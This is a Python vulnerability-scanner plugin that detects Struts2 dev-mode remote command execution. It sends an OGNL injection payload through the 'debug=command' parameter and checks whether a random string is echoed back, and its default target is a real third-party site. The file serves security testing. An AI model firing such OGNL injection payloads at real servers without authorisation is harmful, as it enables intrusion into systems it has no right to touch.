#!/usr/bin/env python
# -*- coding: utf-8 -*-

from lib.core.BKScan import BKScan
from lib.core.req import post
from lib.utils.hash import md5
from lib.utils.funcs import randStr

class ScanCode(BKScan,object):
    """ScanCode Class"""

    def __init__(self):

        super(ScanCode, self).__init__()

        self.metainfo.upsert({
            "author":"Scott Deng",
            "app":"struts",
            "version":"",
            "url":"",
            "para":"",
            "type":"RCE",
            "desc":"struts dev mode 开启，导致远程命令执行",
            "scantype":"PAGESCAN",
            })

        self.options.upsert({
        "url":{
            "required":True,
            "default":"http://www.baidu.com",
            "desc":"url 参数"
            },
        })

        self.result.upsert({
        "state": False, # True or False
        "message":"",
        "data":{
            "vuln":{"url":"","para":"","payload":""},
            "etc":{"value":""}
        },
        })

    def pagescan(self):

        rStr = randStr(length=10)
        test_post = {
        'debug':'command',
        'expression':'(#wr=#context[#parameters.obj[0]].getWriter())!=(#wr.println(#parameters.content[0]))!=(#wr.flush())!=(#wr.close())',
        'obj':'com.opensymphony.xwork2.dispatcher.HttpServletResponse',
        'content':rStr
        }

        turl = self.options['url']["default"]
        r = post(url = turl, data=test_post)
        response  = r.text
        if ('true' in response or rStr in response or 'null' in response) and len(response) < 20:
            self.result.upsert({
            "state" : True,
            "message" : "struts2 dev mode vulnerability EXISTS",
            "data" : {
                "vuln" : {"url" : turl,  "payload" : str(test_post)},
                "etc" : {"value" : response},
            }})

        else:
            self.result.upsert({
            "state" : False,
            "message" : "struts2 dev mode vulnerability DO NOT exists",
            })
            

if __name__ == "__main__":
    pass
